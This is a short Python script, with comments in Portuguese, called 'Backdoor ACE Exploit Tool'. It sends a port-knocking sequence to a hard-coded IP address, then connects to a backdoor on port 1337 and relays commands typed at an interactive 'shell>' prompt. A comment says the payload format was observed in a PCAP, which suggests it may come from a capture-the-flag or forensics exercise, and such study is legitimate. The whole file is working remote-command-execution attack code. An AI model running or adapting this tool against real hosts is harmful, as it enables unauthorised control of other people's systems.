#!/usr/bin/env python3
import socket
import sys
from time import sleep

# Configurações
TARGET_IP = "37.59.174.235"
PORT_SEQUENCE = [13, 37, 30000, 3000]  # Sequência de ativação
BACKDOOR_PORT = 1337                    # Porta do backdoor
TIMEOUT = 2                             # Timeout em segundos

def send_activation_sequence():
    """Envia a sequência mágica para ativar o backdoor"""
    print("[*] Enviando sequência de ativação...")
    for port in PORT_SEQUENCE:
        try:
            s = socket.socket()
            s.settimeout(TIMEOUT)
            s.connect_ex((TARGET_IP, port))
            print(f"[+] Porta {port} ativada")
            s.close()
        except:
            print(f"[-] Falha na porta {port}")
        sleep(0.3)

def exploit_backdoor(command):
    """Explora o backdoor enviando comandos"""
    try:
        s = socket.socket()
        s.settimeout(TIMEOUT)
        
        # Conecta ao backdoor
        s.connect((TARGET_IP, BACKDOOR_PORT))
        print("[+] Conexão estabelecida com o backdoor!")
        
        # Envia payload malicioso (formato observado no PCAP)
        payload = f"[SYN] SeePS Win=512 Len=9;{command}\x00".encode()
        s.send(payload)
        
        # Recebe resposta (se houver)
        response = s.recv(4096)
        if response:
            print("[+] Resposta recebida:\n" + response.decode('utf-8', errors='ignore'))
        
        s.close()
        return True
        
    except Exception as e:
        print(f"[-] Erro: {str(e)}")
        return False

if __name__ == "__main__":
    print("\n" + "="*50)
    print("Backdoor ACE Exploit Tool".center(50))
    print("="*50 + "\n")
    
    # 1. Ativa o backdoor
    send_activation_sequence()
    
    # 2. Exploração
    while True:
        cmd = input("\nshell> ")
        if cmd.lower() in ["exit", "quit"]:
            break
            
        if cmd == "id":
            # Comando especial para identificar o malware
            exploit_backdoor("get_malware_info")
        else:
            exploit_backdoor(cmd)
